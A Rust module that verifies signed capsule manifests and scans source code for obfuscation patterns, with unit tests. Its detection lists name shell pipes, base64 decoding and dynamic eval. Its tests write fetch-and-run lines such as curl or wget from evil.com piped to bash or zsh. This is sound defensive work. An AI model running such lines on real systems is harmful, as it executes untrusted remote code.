use crate::capsule_types::capsule_v1::CapsuleManifestV1;
use crate::capsule_types::signing::{
    ensure_signature_matches_manifest, verify_signature_file, SignatureFile,
};
use anyhow::{anyhow, Result};
use base64::{engine::general_purpose::STANDARD as BASE64, Engine as _};
use regex::Regex;
use tracing::{info, warn};

use crate::capnp_to_manifest::manifest_to_capnp_bytes;

/// Verifies capsule manifests against a trusted public key.
///
/// **Canonical Signing**: As of v2.0, all signature verification uses Cap'n Proto
/// canonical bytes. This ensures that regardless of the input format (JSON, TOML,
/// or Cap'n Proto), the same manifest content produces the same signature.
#[derive(Clone, Debug)]
pub struct ManifestVerifier {
    public_key_fingerprint: Option<String>,
    enforce: bool,
}

impl ManifestVerifier {
    pub fn new(public_key_fingerprint: Option<String>, enforce: bool) -> Self {
        if public_key_fingerprint.is_none() {
            warn!("Security: No public key configured. Signature verification will be skipped.");
        }
        Self {
            public_key_fingerprint,
            enforce,
        }
    }

    pub fn is_enforcing(&self) -> bool {
        self.enforce
    }

    /// Verifies a manifest struct directly against the provided signature.
    /// This is the preferred method as it uses canonical Cap'n Proto bytes.
    ///
    /// # Arguments
    /// * `manifest` - The parsed CapsuleManifestV1 struct
    /// * `signature_bytes` - The raw bytes of the signature file (Ed25519)
    /// * `developer_key` - The developer key fingerprint from the manifest (e.g., "ed25519:...")
    pub fn verify_manifest(
        &self,
        manifest: &CapsuleManifestV1,
        signature_bytes: &[u8],
        developer_key: &str,
    ) -> Result<()> {
        // Generate canonical Cap'n Proto bytes for verification (UARC V1.1.0)
        let canonical_bytes = manifest_to_capnp_bytes(manifest)
            .map_err(|e| anyhow!("Failed to generate canonical bytes: {:?}", e))?;

        info!(
            "Security: Generated canonical bytes for verification ({} bytes, first 16: {:02x?})",
            canonical_bytes.len(),
            &canonical_bytes[..16.min(canonical_bytes.len())]
        );

        self.verify_canonical_bytes(&canonical_bytes, signature_bytes, developer_key)
    }

    /// Verifies the content against the provided signature.
    ///
    /// **DEPRECATED**: Use `verify_manifest()` for new code.
    /// This method parses the content and converts to canonical Cap'n Proto bytes.
    ///
    /// # Arguments
    /// * `content` - The raw bytes of the manifest (JSON/TOML)
    /// * `signature_bytes` - The raw bytes of the signature file (Ed25519)
    /// * `developer_key` - The developer key fingerprint from the manifest (e.g., "ed25519:...")
    pub fn verify(
        &self,
        content: &[u8],
        signature_bytes: &[u8],
        developer_key: &str,
    ) -> Result<()> {
        // Parse content to manifest (try JSON first, then TOML)
        let manifest = self.parse_content_to_manifest(content)?;

        // Use canonical verification
        self.verify_manifest(&manifest, signature_bytes, developer_key)
    }

    /// Internal method: verify using pre-computed canonical bytes
    fn verify_canonical_bytes(
        &self,
        canonical_bytes: &[u8],
        signature_bytes: &[u8],
        developer_key: &str,
    ) -> Result<()> {
        // 1. Check if we have a trusted root key configured
        let trusted_key = match &self.public_key_fingerprint {
            Some(k) => k,
            None => {
                if self.enforce {
                    return Err(anyhow!(
                        "Security: signature verification is enforced but no trusted public key is configured"
                    ));
                }
                // If no key is configured, we cannot verify.
                return Ok(());
            }
        };

        // 2. Parse the signature file
        let sig_file = self
            .parse_signature_bytes(signature_bytes)
            .map_err(|e| anyhow!("Invalid signature format: {}", e))?;

        // 3. Ensure the signature's public key matches the trusted key
        // Note: legacy tooling used `ensure_signature_matches_manifest` to check if signature.public_key == manifest.developer_key.
        // But if manifest.developer_key is empty (V1), we can't use that check effectively for TRUST.
        // We fundamentally want to know: "Is this signature signed by our Trusted Key?"

        // We construct a temporary key fingerprint from the signature itself
        let sig_key_fingerprint = format!("ed25519:{}", BASE64.encode(sig_file.public_key));
        if sig_key_fingerprint != *trusted_key {
            return Err(anyhow!(
                "Signature key {} is not the trusted signer {}",
                sig_key_fingerprint,
                trusted_key
            ));
        }

        // 4. If developer_key is provided (from manifest), check it matches too (optional consistency check used by legacy tooling)
        if !developer_key.is_empty() {
            ensure_signature_matches_manifest(&sig_file, developer_key).map_err(|e| {
                anyhow!("Signature key mismatch with manifest developer_key: {}", e)
            })?;
        }

        // 5. Verify the cryptographic signature against CANONICAL bytes
        verify_signature_file(&sig_file, canonical_bytes)
            .map_err(|e| anyhow!("Cryptographic verification failed: {}", e))?;

        info!(
            "Security: Manifest verified successfully using canonical Cap'n Proto bytes for trusted signer {}",
            trusted_key
        );
        Ok(())
    }

    /// Parse raw content bytes into a CapsuleManifestV1
    /// Tries JSON first, then TOML
    fn parse_content_to_manifest(&self, content: &[u8]) -> Result<CapsuleManifestV1> {
        let content_str = std::str::from_utf8(content)
            .map_err(|e| anyhow!("Invalid UTF-8 in manifest content: {}", e))?;

        // Try JSON first
        if let Ok(manifest) = serde_json::from_str::<CapsuleManifestV1>(content_str) {
            return Ok(manifest);
        }

        // Try TOML
        if let Ok(manifest) = toml::from_str::<CapsuleManifestV1>(content_str) {
            return Ok(manifest);
        }

        Err(anyhow!("Failed to parse manifest as JSON or TOML"))
    }

    fn parse_signature_bytes(&self, data: &[u8]) -> Result<SignatureFile> {
        // Logic adapted from legacy signature format `read_signature_file`
        if data.len() < 1 + 1 + 32 + 64 + 2 {
            return Err(anyhow!("signature file too short"));
        }
        let version = data[0];
        let key_type = data[1];
        let mut offset = 2;

        let mut public_key = [0u8; 32];
        if data.len() < offset + 32 {
            return Err(anyhow!("invalid length"));
        }
        public_key.copy_from_slice(&data[offset..offset + 32]);
        offset += 32;

        let mut sig_bytes = [0u8; 64];
        if data.len() < offset + 64 {
            return Err(anyhow!("invalid length"));
        }
        sig_bytes.copy_from_slice(&data[offset..offset + 64]);
        offset += 64;
        let signature = ed25519_dalek::Signature::from_bytes(&sig_bytes);

        let metadata_len = u16::from_be_bytes([data[offset], data[offset + 1]]) as usize;
        offset += 2;
        if data.len() < offset + metadata_len {
            return Err(anyhow!("signature metadata length out of bounds"));
        }
        let metadata_bytes = &data[offset..offset + metadata_len];
        let metadata: serde_json::Value = serde_json::from_slice(metadata_bytes)
            .map_err(|e| anyhow!("failed to parse signature metadata JSON: {}", e))?;

        Ok(SignatureFile {
            version,
            key_type,
            public_key,
            signature,
            metadata,
        })
    }
}

// ============================================================================
// L1 Source Policy (UARC V1.1.0)
// ============================================================================

/// L1 Source Policy verification errors
#[derive(Debug, thiserror::Error)]
pub enum L1PolicyError {
    #[error("Source CAS unavailable: {0}")]
    CasUnavailable(String),

    #[error("Source blob not found: {0}")]
    BlobNotFound(String),

    #[error("Obfuscation detected: {pattern} found in {file}")]
    ObfuscationDetected { pattern: String, file: String },

    #[error("Invalid source reference: {0}")]
    InvalidSourceRef(String),

    #[error("Source digest mismatch: expected {expected}, got {actual}")]
    DigestMismatch { expected: String, actual: String },

    #[error("Invalid CAS reference format: {0}")]
    InvalidCasFormat(String),

    #[error("IO error: {0}")]
    IoError(#[from] std::io::Error),
}

/// Dangerous patterns that indicate potential obfuscation or code injection.
/// These patterns are scanned in source files per UARC V1.1.0 L1 policy.
const DANGEROUS_PATTERNS: &[(&str, &str)] = &[
    ("base64 -d", "Base64 decode in shell"),
    ("base64 --decode", "Base64 decode in shell"),
    ("eval(", "Dynamic code evaluation"),
    ("exec(", "Dynamic code execution"),
    // Shell pipe patterns (with various spacing)
    ("| sh", "Remote script execution via pipe to sh"),
    ("|sh", "Remote script execution via pipe to sh"),
    ("| bash", "Remote script execution via pipe to bash"),
    ("|bash", "Remote script execution via pipe to bash"),
    ("__import__", "Dynamic Python import"),
    ("importlib.import_module", "Dynamic Python import"),
    ("subprocess.Popen", "Subprocess execution (requires review)"),
    ("os.system(", "Shell command execution"),
    ("os.popen(", "Shell command execution"),
];

/// Regex patterns for L1 policy checks (UARC V1.1.0).
/// These handle whitespace variations and complex patterns that simple substring matching cannot detect.
const DANGEROUS_REGEX_PATTERNS: &[(&str, &str)] = &[
    // Remote code injection via curl/wget piped to shell (handles whitespace variations)
    (
        r"(?i)(curl|wget)\s+.*\|\s*(sh|bash|zsh|ksh)",
        "Remote code injection via pipe to shell",
    ),
    // Hidden network fetches with shell execution
    (
        r"(?i)(curl|wget)\s+-[a-z]*s[a-z]*\s+.*\|\s*\w+",
        "Hidden download piped to command",
    ),
];

/// Verifies L1 Source Policy for a capsule.
///
/// L1 Source Policy ensures that:
/// 1. All source code is available in CAS (content-addressable storage)
/// 2. Source code does not contain obfuscation patterns
/// 3. The source hash matches the manifest's `source_digest` field
///
/// # Arguments
/// * `source_path` - Path to the extracted source code directory
/// * `scan_extensions` - File extensions to scan (e.g., ["py", "sh", "js"])
///
/// # Returns
/// * `Ok(())` if all L1 checks pass
/// * `Err(L1PolicyError)` if any check fails
pub fn verify_l1_source_policy(
    source_path: &std::path::Path,
    scan_extensions: &[&str],
) -> Result<(), L1PolicyError> {
    if !source_path.exists() {
        return Err(L1PolicyError::BlobNotFound(
            source_path.display().to_string(),
        ));
    }

    // Recursively scan all files with matching extensions
    scan_directory_for_patterns(source_path, scan_extensions)?;

    info!(
        "L1 Source Policy: Verification passed for {:?}",
        source_path
    );
    Ok(())
}

fn scan_directory_for_patterns(
    dir: &std::path::Path,
    extensions: &[&str],
) -> Result<(), L1PolicyError> {
    use std::fs;

    if dir.is_file() {
        if let Some(ext) = dir.extension() {
            if extensions.iter().any(|e| e == &ext.to_string_lossy()) {
                scan_file_for_patterns(dir)?;
            }
        }
        return Ok(());
    }

    let entries = fs::read_dir(dir)?;

    for entry in entries {
        let entry = entry?;
        let path = entry.path();

        if path.is_dir() {
            // Skip common non-source directories
            let dir_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("");
            if matches!(
                dir_name,
                "node_modules" | ".git" | "__pycache__" | ".venv" | "target" | "build" | "dist"
            ) {
                continue;
            }
            scan_directory_for_patterns(&path, extensions)?;
        } else if let Some(ext) = path.extension() {
            if extensions.iter().any(|e| e == &ext.to_string_lossy()) {
                scan_file_for_patterns(&path)?;
            }
        }
    }

    Ok(())
}

fn scan_file_for_patterns(file_path: &std::path::Path) -> Result<(), L1PolicyError> {
    use std::fs;

    let content = fs::read_to_string(file_path)?;
    let content_lower = content.to_lowercase();

    // Check simple substring patterns first
    for (pattern, _description) in DANGEROUS_PATTERNS {
        if content_lower.contains(&pattern.to_lowercase()) {
            warn!(
                "L1 Policy: Dangerous pattern '{}' detected in {:?}",
                pattern, file_path
            );
            return Err(L1PolicyError::ObfuscationDetected {
                pattern: pattern.to_string(),
                file: file_path.display().to_string(),
            });
        }
    }

    // Check regex patterns for more complex detection (UARC V1.1.0 L1)
    for (regex_pattern, description) in DANGEROUS_REGEX_PATTERNS {
        if let Ok(re) = Regex::new(regex_pattern) {
            if re.is_match(&content) {
                warn!(
                    "L1 Policy: Dangerous regex pattern '{}' ({}) detected in {:?}",
                    regex_pattern, description, file_path
                );
                return Err(L1PolicyError::ObfuscationDetected {
                    pattern: format!("{} (regex: {})", description, regex_pattern),
                    file: file_path.display().to_string(),
                });
            }
        }
    }

    Ok(())
}

/// Check if a source digest is available in CAS.
/// Returns the local path to the blob if available.
pub async fn fetch_source_from_cas(
    cas_client: &dyn crate::cas::CasClient,
    digest: &str,
) -> Result<std::path::PathBuf, L1PolicyError> {
    cas_client
        .fetch_blob(digest)
        .await
        .map_err(|e| L1PolicyError::CasUnavailable(e.to_string()))
}

/// Validates a CAS reference format (UARC V1.1.0)
///
/// CAS references must be in the format: `sha256:<64_hex_chars>`
/// This function validates the format and returns the hash portion if valid.
///
/// # Arguments
/// * `reference` - The CAS reference string to validate
///
/// # Returns
/// * `Ok(&str)` - The hash portion (64 hex chars) if valid
/// * `Err(L1PolicyError)` - If the format is invalid
pub fn validate_cas_reference(reference: &str) -> Result<&str, L1PolicyError> {
    // Check for sha256: prefix
    let hash = reference.strip_prefix("sha256:").ok_or_else(|| {
        L1PolicyError::InvalidCasFormat(format!(
            "CAS reference must start with 'sha256:', got: {}",
            reference
        ))
    })?;

    // Validate length (SHA256 = 64 hex characters)
    if hash.len() != 64 {
        return Err(L1PolicyError::InvalidCasFormat(format!(
            "CAS reference hash must be 64 hex characters, got {} characters",
            hash.len()
        )));
    }

    // Validate hex characters
    if !hash.chars().all(|c| c.is_ascii_hexdigit()) {
        return Err(L1PolicyError::InvalidCasFormat(format!(
            "CAS reference hash contains non-hex characters: {}",
            hash
        )));
    }

    Ok(hash)
}

/// Verifies source digest matches CAS content (UARC V1.1.0 L1)
///
/// This function:
/// 1. Validates the source_digest format
/// 2. Fetches the source from CAS
/// 3. Computes SHA256 of the fetched content
/// 4. Verifies the computed hash matches source_digest
///
/// # Arguments
/// * `cas_client` - CAS client for fetching blobs
/// * `source_digest` - Expected digest from manifest (sha256:...)
///
/// # Returns
/// * `Ok(PathBuf)` - Path to the verified source content
/// * `Err(L1PolicyError)` - If verification fails
pub async fn verify_source_digest(
    cas_client: &dyn crate::cas::CasClient,
    source_digest: &str,
) -> Result<std::path::PathBuf, L1PolicyError> {
    use sha2::{Digest, Sha256};
    use std::fs;

    // Validate format
    let expected_hash = validate_cas_reference(source_digest)?;

    // Fetch from CAS
    let source_path = fetch_source_from_cas(cas_client, source_digest).await?;

    // Compute actual hash
    let content = fs::read(&source_path)?;
    let mut hasher = Sha256::new();
    hasher.update(&content);
    let actual_hash = hex::encode(hasher.finalize());

    // Compare
    if actual_hash != expected_hash {
        return Err(L1PolicyError::DigestMismatch {
            expected: expected_hash.to_string(),
            actual: actual_hash,
        });
    }

    info!("L1 Policy: Source digest verified: {}", source_digest);
    Ok(source_path)
}

#[cfg(test)]
mod l1_policy_tests {
    use super::*;
    use std::fs;
    use tempfile::TempDir;

    #[test]
    fn test_clean_source_passes() {
        let temp_dir = TempDir::new().unwrap();
        let test_file = temp_dir.path().join("main.py");
        fs::write(&test_file, "def main():\n    print('Hello, World!')").unwrap();

        let result = verify_l1_source_policy(temp_dir.path(), &["py"]);
        assert!(result.is_ok());
    }

    #[test]
    fn test_obfuscated_eval_fails() {
        let temp_dir = TempDir::new().unwrap();
        let test_file = temp_dir.path().join("malicious.py");
        fs::write(&test_file, "eval(some_user_input)").unwrap();

        let result = verify_l1_source_policy(temp_dir.path(), &["py"]);
        assert!(matches!(
            result,
            Err(L1PolicyError::ObfuscationDetected { .. })
        ));
    }

    #[test]
    fn test_curl_pipe_fails() {
        let temp_dir = TempDir::new().unwrap();
        let test_file = temp_dir.path().join("setup.sh");
        fs::write(&test_file, "curl https://example.com/install.sh | sh").unwrap();

        let result = verify_l1_source_policy(temp_dir.path(), &["sh"]);
        assert!(matches!(
            result,
            Err(L1PolicyError::ObfuscationDetected { .. })
        ));
    }

    #[test]
    fn test_base64_decode_fails() {
        let temp_dir = TempDir::new().unwrap();
        let test_file = temp_dir.path().join("install.sh");
        fs::write(&test_file, "echo 'payload' | base64 -d | bash").unwrap();

        let result = verify_l1_source_policy(temp_dir.path(), &["sh"]);
        assert!(matches!(
            result,
            Err(L1PolicyError::ObfuscationDetected { .. })
        ));
    }

    #[test]
    fn test_nonexistent_path_fails() {
        let result = verify_l1_source_policy(std::path::Path::new("/nonexistent/path"), &["py"]);
        assert!(matches!(result, Err(L1PolicyError::BlobNotFound(_))));
    }

    #[test]
    fn test_curl_pipe_with_spaces_fails() {
        let temp_dir = TempDir::new().unwrap();
        let test_file = temp_dir.path().join("install.sh");
        // Test with various whitespace patterns
        fs::write(&test_file, "curl   https://evil.com/script   |   bash").unwrap();

        let result = verify_l1_source_policy(temp_dir.path(), &["sh"]);
        assert!(matches!(
            result,
            Err(L1PolicyError::ObfuscationDetected { .. })
        ));
    }

    #[test]
    fn test_wget_pipe_with_options_fails() {
        let temp_dir = TempDir::new().unwrap();
        let test_file = temp_dir.path().join("bootstrap.sh");
        // wget with options followed by pipe to shell
        fs::write(&test_file, "wget -qO- https://evil.com/run | zsh").unwrap();

        let result = verify_l1_source_policy(temp_dir.path(), &["sh"]);
        assert!(matches!(
            result,
            Err(L1PolicyError::ObfuscationDetected { .. })
        ));
    }

    #[test]
    fn test_mixed_case_curl_pipe_fails() {
        let temp_dir = TempDir::new().unwrap();
        let test_file = temp_dir.path().join("setup.sh");
        // Case-insensitive detection
        fs::write(&test_file, "CURL http://evil.com |   SH").unwrap();

        let result = verify_l1_source_policy(temp_dir.path(), &["sh"]);
        assert!(matches!(
            result,
            Err(L1PolicyError::ObfuscationDetected { .. })
        ));
    }

    #[test]
    fn test_valid_cas_reference() {
        let valid_ref = "sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
        assert!(validate_cas_reference(valid_ref).is_ok());
        assert_eq!(
            validate_cas_reference(valid_ref).unwrap(),
            "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
        );
    }

    #[test]
    fn test_invalid_cas_reference_no_prefix() {
        let invalid_ref = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
        assert!(matches!(
            validate_cas_reference(invalid_ref),
            Err(L1PolicyError::InvalidCasFormat(_))
        ));
    }

    #[test]
    fn test_invalid_cas_reference_wrong_length() {
        let invalid_ref = "sha256:0123456789abcdef"; // Too short
        assert!(matches!(
            validate_cas_reference(invalid_ref),
            Err(L1PolicyError::InvalidCasFormat(_))
        ));
    }

    #[test]
    fn test_invalid_cas_reference_non_hex() {
        let invalid_ref = "sha256:ghij456789abcdef0123456789abcdef0123456789abcdef0123456789abcd";
        assert!(matches!(
            validate_cas_reference(invalid_ref),
            Err(L1PolicyError::InvalidCasFormat(_))
        ));
    }
}
